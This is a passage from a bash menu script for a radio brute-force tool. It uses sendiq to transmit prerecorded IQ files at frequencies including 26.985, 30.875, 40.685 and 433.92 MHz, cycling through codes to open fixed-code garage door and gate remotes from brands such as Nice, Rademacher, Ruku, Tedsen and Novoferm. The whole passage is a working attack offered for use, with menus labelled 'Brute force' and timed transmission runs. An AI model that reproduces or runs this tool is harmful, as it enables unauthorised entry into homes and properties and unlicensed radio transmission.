     sudo ./sendiq -s 250000 -f "30.900"e6 -t u8 -i .derrow/1-nice-30-9.iq
     echo
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     nice2

     elif [[ $nu = 00 ]];then
     nice2

     else
     nice2
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     nice2
     fi


     }
     nice2

    ;;
  23)function nice3(){
     clear
     echo -e $white "$white $rouge3 Nice " | toilet -f mono9 -F border | lolcat
     echo -e $bleu2 "$bleu $bleu2 $noir2  Nice 30 " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge France     $bleu 📶 frequency: $vert 30MHz   $cyan ⏳ Time: $white 9min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 5 Nice 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 30.875MHz   $cyan ⏳ Time: $white 9min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "30.875"e6 -t u8 -i .derrow/1-nice-30.iq &
     bash timeur.sh 9
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     nice3


     elif [[ $n = 2 ]];then
      echo -e " $white Nice 26            $vert 26MHz " | toilet -f term -F border
      echo -e " $white Nice 27            $vert 27MHz " | toilet -f term -F border
      echo -e " $white Nice 30            $vert 30MHz " | toilet -f term -F border
      echo -e " $white Nice 30.9          $vert 30.9MHz " | toilet -f term -F border
      echo -e " $white Nice flo 433       $vert 433.92MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time pour the 5 télecommandes: $white 40min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 39 &
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-nice-flo-433.iq
     sudo ./sendiq -s 250000 -f "26.875"e6 -t u8 -i .derrow/1-nice-26.iq
     sudo ./sendiq -s 250000 -f "27.120"e6 -t u8 -i .derrow/1-nice-27.iq
     sudo ./sendiq -s 250000 -f "30.875"e6 -t u8 -i .derrow/1-nice-30.iq
     sudo ./sendiq -s 250000 -f "30.900"e6 -t u8 -i .derrow/1-nice-30-9.iq
     echo
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     nice3

     elif [[ $nu = 00 ]];then
     nice3

     else
     nice3
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     nice3
     fi


     }
     nice3

    ;;
  24)function nice4(){
     clear
     echo -e $white "$white $rouge3 Nice " | toilet -f mono9 -F border | lolcat
     echo -e $bleu2 "$bleu $bleu2 $noir2  Nice 30.9 " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge France     $bleu 📶 frequency: $vert 30.900MHz   $cyan ⏳ Time: $white //min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 5 Nice 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 30.9MHz   $cyan ⏳ Time: $white 9min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "30.900"e6 -t u8 -i .derrow/1-nice-30-9.iq &
     bash timeur.sh 9
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     nice4


     elif [[ $n = 2 ]];then
      echo -e " $white Nice 26            $vert 26MHz " | toilet -f term -F border
      echo -e " $white Nice 27            $vert 27MHz " | toilet -f term -F border
      echo -e " $white Nice 30            $vert 30MHz " | toilet -f term -F border
      echo -e " $white Nice 30.9          $vert 30.9MHz " | toilet -f term -F border
      echo -e " $white Nice flo 433       $vert 433.92MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time pour the 5 télecommandes: $white 40min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 39 &
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-nice-flo-433.iq
     sudo ./sendiq -s 250000 -f "26.875"e6 -t u8 -i .derrow/1-nice-26.iq
     sudo ./sendiq -s 250000 -f "27.120"e6 -t u8 -i .derrow/1-nice-27.iq
     sudo ./sendiq -s 250000 -f "30.875"e6 -t u8 -i .derrow/1-nice-30.iq
     sudo ./sendiq -s 250000 -f "30.900"e6 -t u8 -i .derrow/1-nice-30-9.iq
     echo
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     nice4

     elif [[ $nu = 00 ]];then
     nice4

     else
     nice4
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     nice4
     fi


     }
     nice4

    ;;
  25)function nice5(){
     clear
     echo -e $white "$white $rouge3 Nice " | toilet -f mono9 -F border | lolcat
     echo -e $bleu2 "$bleu $bleu2 $noir2  Nice flo 433 " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge France     $bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 4min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 5 Nice 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend) "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other boutton"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 4min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-nice-flo-433.iq &
     bash timeur.sh 4
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     nice5
     elif [[ $nuu = 00 ]];then
     nice5
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 15min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/nice-flo-433.iq &
     bash timeur.sh 15
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     nice5
     fi

     elif [[ $n = 2 ]];then
      echo -e " $white Nice 26            $vert 26MHz " | toilet -f term -F border
      echo -e " $white Nice 27            $vert 27MHz " | toilet -f term -F border
      echo -e " $white Nice 30            $vert 30MHz " | toilet -f term -F border
      echo -e " $white Nice 30.9          $vert 30.9MHz " | toilet -f term -F border
      echo -e " $white Nice flo 433       $vert 433.92MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time pour the 5 télecommandes: $white 40min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 39 &
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-nice-flo-433.iq
     sudo ./sendiq -s 250000 -f "26.875"e6 -t u8 -i .derrow/1-nice-26.iq
     sudo ./sendiq -s 250000 -f "27.120"e6 -t u8 -i .derrow/1-nice-27.iq
     sudo ./sendiq -s 250000 -f "30.875"e6 -t u8 -i .derrow/1-nice-30.iq
     sudo ./sendiq -s 250000 -f "30.900"e6 -t u8 -i .derrow/1-nice-30-9.iq
     echo
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     nice5

     elif [[ $nu = 00 ]];then
     nice5

     else
     nice5
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     nice5
     fi


     }
     nice5

    ;;
  26)function rademacher(){
     clear
     echo -e $white "$white $rouge3 Rademacher " | toilet -f mono9 -F border | lolcat
     echo -e $white "$noir $white2 $noir2  Rademacher 40" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 4min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend) "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other boutton"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 4min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-rademacher-40.iq &
     bash timeur.sh 4
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     rademacher
     elif [[ $nuu = 00 ]];then
     rademacher
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 12min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/rademacher-40.iq &
     bash timeur.sh 12
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     rademacher
     fi


     elif [[ $n = 00 ]];then
      brute
     else
     rademacher
     fi
     }
     rademacher

    ;;
  27)function ruku(){
     clear
     echo -e $white "$white $rouge3 Ruku " | toilet -f mono9 -F border | lolcat
     echo -e $jaune2 "$noir $noir2 $jaune2  Ruku SA 40 AM " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 4min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 4 Ruku 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 4min $jaune2 Boutton A" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/Ruku-SA-40AM.iq &
     bash timeur.sh 4
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     ruku


     elif [[ $n = 2 ]];then
      echo -e " $white Ruku SA 40 AM      $vert 40MHz " | toilet -f term -F border
      echo -e " $white Ruku SA 433 AM     $vert 433MHz " | toilet -f term -F border
      echo -e " $white Ruku SF 40 FM      $vert 40MHz " | toilet -f term -F border
      echo -e " $white Ruku SF 433 FM     $vert 433MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 4 remotes: $white 16min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 18 &
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/Ruku-SA-40AM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/Ruku-SA-433AM.iq
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/Ruku-SF-40FM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/Ruku-SF-433FM.iq
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     ruku

     elif [[ $nu = 00 ]];then
     ruku

     else
     ruku
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     ruku
     fi


     }
     ruku

    ;;
  28)function ruku2(){
     clear
     echo -e $white "$white $rouge3 Ruku " | toilet -f mono9 -F border | lolcat
     echo -e $jaune2 "$noir $noir2 $jaune2  Ruku SA 433 AM " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 4min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 4 Ruku 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 4min $jaune2 Boutton A" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/Ruku-SA-433AM.iq &
     bash timeur.sh 4
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     ruku2


     elif [[ $n = 2 ]];then
      echo -e " $white Ruku SA 40 AM      $vert 40MHz " | toilet -f term -F border
      echo -e " $white Ruku SA 433 AM     $vert 433MHz " | toilet -f term -F border
      echo -e " $white Ruku SF 40 FM      $vert 40MHz " | toilet -f term -F border
      echo -e " $white Ruku SF 433 FM     $vert 433MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 4 remotes: $white 16min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 18 &
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/Ruku-SA-40AM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/Ruku-SA-433AM.iq
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/Ruku-SF-40FM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/Ruku-SF-433FM.iq
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     ruku2

     elif [[ $nu = 00 ]];then
     ruku2

     else
     ruku2
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     ruku2
     fi

     }
     ruku2


    ;;
  29)function ruku3(){
     clear
     echo -e $white "$white $rouge3 Ruku " | toilet -f mono9 -F border | lolcat
     echo -e $jaune2 "$noir $noir2 $jaune2  Ruku SF 40 FM " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 40MHz   $cyan ⏳ Time: $white 4min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 4 Ruku 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 4min $jaune2 Boutton A" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/Ruku-SF-40FM.iq &
     bash timeur.sh 4
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     ruku3


     elif [[ $n = 2 ]];then
      echo -e " $white Ruku SA 40 AM      $vert 40MHz " | toilet -f term -F border
      echo -e " $white Ruku SA 433 AM     $vert 433MHz " | toilet -f term -F border
      echo -e " $white Ruku SF 40 FM      $vert 40MHz " | toilet -f term -F border
      echo -e " $white Ruku SF 433 FM     $vert 433MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 4 remotes: $white 18min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 18 &
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/Ruku-SA-40AM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/Ruku-SA-433AM.iq
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/Ruku-SF-40FM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/Ruku-SF-433FM.iq
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     ruku3

     elif [[ $nu = 00 ]];then
     ruku3

     else
     ruku3
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     ruku3
     fi


     }
     ruku3

    ;;
  30)function ruku4(){
     clear
     echo -e $white "$white $rouge3 Ruku " | toilet -f mono9 -F border | lolcat
     echo -e $jaune2 "$noir $noir2 $jaune2  Ruku SF 433 FM " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 4min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 4 Ruku 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 4min $jaune2 Boutton A" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/Ruku-SF-433FM.iq &
     bash timeur.sh 4
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     ruku4

     elif [[ $n = 2 ]];then
      echo -e " $white Ruku SA 40 AM      $vert 40MHz " | toilet -f term -F border
      echo -e " $white Ruku SA 433 AM     $vert 433MHz " | toilet -f term -F border
      echo -e " $white Ruku SF 40 FM      $vert 40MHz " | toilet -f term -F border
      echo -e " $white Ruku SF 433 FM     $vert 433MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 4 remotes: $white 16min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 18 &
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/Ruku-SA-40AM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/Ruku-SA-433AM.iq
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/Ruku-SF-40FM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/Ruku-SF-433FM.iq
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     ruku4

     elif [[ $nu = 00 ]];then
     ruku4

     else
     ruku4
     fi

     elif [[ $n = 00 ]];then
      brute
     else
     ruku4
     fi


     }
     ruku4

    ;;


31)function tedsen(){
     clear
     echo -e $white "$white $rouge3 Tedsen " | toilet -f mono9 -F border | lolcat
     echo -e $vert "$white $noir2 $vert  Tedsen 27 " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 26.985MHz   $cyan ⏳ Time: $white 1min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 3 Tedsen 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend) "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other boutton"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis                                                                                                                                                     echo -e "$bleu 📶 frequency: $vert 26.985MHz   $cyan ⏳ Time: $white 1min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "26.985"e6 -t u8 -i .derrow/1-tedsen-27.iq &
     bash timeur.sh 1
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     tedsen
     elif [[ $nuu = 00 ]];then
     tedsen
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 26.985MHz   $cyan ⏳ Time: $white 4min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "26.985"e6 -t u8 -i .derrow/tedsen-27.iq &
     bash timeur.sh 4
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     tedsen
     fi


     elif [[ $n = 2 ]];then
      echo -e " $white Tedsen 27          $vert 27MHz " | toilet -f term -F border
      echo -e " $white Tedsen 433         $vert 433MHz " | toilet -f term -F border
      echo -e " $white Tedsen 433 Quick   $vert 433MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 3 remotes: $white 15min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 15 &
     sudo ./sendiq -s 250000 -f "26.985"e6 -t u8 -i .derrow/1-tedsen-27.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/tedsen-433.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/tedsen-quick-433.iq
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     tedsen

     elif [[ $nu = 00 ]];then
     tedsen

     else
     tedsen
     fi                                                                                                                                                             elif [[ $n = 00 ]];then
      brute
     else
     tedsen
     fi


     }
     tedsen
     ;;
  32)function tedsen2(){
     clear
     echo -e $white "$white $rouge3 Tedsen " | toilet -f mono9 -F border | lolcat
     echo -e $vert "$white $noir2 $vert  Tedsen 433 " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 10min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 3 Tedsen 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 10min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/tedsen-433.iq &
     bash timeur.sh 10
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     tedsen2


     elif [[ $n = 2 ]];then
      echo -e " $white Tedsen 27          $vert 27MHz " | toilet -f term -F border
      echo -e " $white Tedsen 433         $vert 433MHz " | toilet -f term -F border
      echo -e " $white Tedsen 433 Quick   $vert 433MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 3 remotes: $white 15min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 15 &
     sudo ./sendiq -s 250000 -f "26.985"e6 -t u8 -i .derrow/1-tedsen-27.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/tedsen-433.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/tedsen-quick-433.iq
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     tedsen2

     elif [[ $nu = 00 ]];then
     tedsen2

     else
     tedsen2
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     tedsen2                                                                                                                                                        fi

     fi
     }
     tedsen2

    ;;
  33)function tedsen3(){
     clear
     echo -e $white "$white $rouge3 Tedsen " | toilet -f mono9 -F border | lolcat
     echo -e $vert "$white $noir2 $vert  Tedsen 433 Quick " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 30sec"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 3 Tedsen 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 30sec $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/tedsen-quick-433.iq &
     bash timeur.sh 0
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     tedsen3


     elif [[ $n = 2 ]];then
      echo -e " $white Tedsen 27          $vert 27MHz " | toilet -f term -F border
      echo -e " $white Tedsen 433         $vert 433MHz " | toilet -f term -F border
      echo -e " $white Tedsen 433 Quick   $vert 433MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 3 remotes: $white 15min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 15 &
     sudo ./sendiq -s 250000 -f "26.985"e6 -t u8 -i .derrow/1-tedsen-27.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/tedsen-433.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/tedsen-quick-433.iq
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     tedsen3

     elif [[ $nu = 00 ]];then
     tedsen3
     else
     tedsen3
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     tedsen3
     fi


     }
     tedsen3

     ;;
  34)function novoferm(){
     clear
     echo -e $white "$white $rouge3 Novoferm " | toilet -f slant -F border | lolcat
     echo -e $white "$white $noir2 $bleu  Tormatic 40 (Novoferm)" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany/France     $bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 6min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 2 Tormatic 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
